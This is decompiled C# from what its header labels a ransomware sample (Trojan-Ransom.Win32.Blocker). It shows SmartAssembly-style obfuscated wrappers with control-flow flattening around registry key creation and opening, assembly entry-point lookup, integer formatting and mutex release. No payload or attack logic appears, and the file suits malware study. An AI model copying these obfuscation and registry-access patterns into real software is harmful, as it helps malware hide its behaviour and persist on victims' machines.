// Decompiled with JetBrains decompiler
// Type: SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace SmartAssembly.SmartExceptionsCore
{
  [AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Method | AttributeTargets.Field | AttributeTargets.Interface | AttributeTargets.Delegate)]
  public sealed class DoNotObfuscateAttribute : Attribute
  {
    public DoNotObfuscateAttribute()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static DoNotObfuscateAttribute()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static RegistryKey Ⴗ([In] RegistryKey obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 61:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 6:
              num1 = 7;
              continue;
            case 1:
              num1 = 7;
              continue;
            case 4:
              goto label_8;
            case 5:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotObfuscateAttribute.Ⴗ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.CreateSubKey(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        RegistryKey o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static RegistryKey Ⴍ([In] RegistryKey obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 109:
            num2 = 6;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 4;
              continue;
            case 1:
              num1 = 4;
              continue;
            case 4:
            case 5:
              goto label_3;
            case 6:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotObfuscateAttribute.Ⴍ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.OpenSubKey(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        RegistryKey o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static MethodInfo Ⴐ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 111:
            num2 = 2;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              goto label_8;
            case 1:
            case 3:
            case 6:
              num1 = 5;
              continue;
            case 4:
              num1 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotObfuscateAttribute.Ⴐ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0.EntryPoint;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Assembly o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string Ⴈ([In] ref int obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 54:
            num2 = 3;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_3;
            case 1:
            case 6:
              num1 = 0;
              continue;
            case 3:
              goto label_8;
            case 4:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotObfuscateAttribute.Ⴈ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.ToString(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static void Ⴄ([In] Mutex obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 5:
              goto label_7;
            case 1:
            case 4:
              num1 = 3;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 58:
                  num2 = 0;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.ReleaseMutex();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Mutex o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴀ
    {
      internal short[] Ⴗ;
      internal int[] Ⴍ;
      internal int Ⴅ;
    }
  }
}
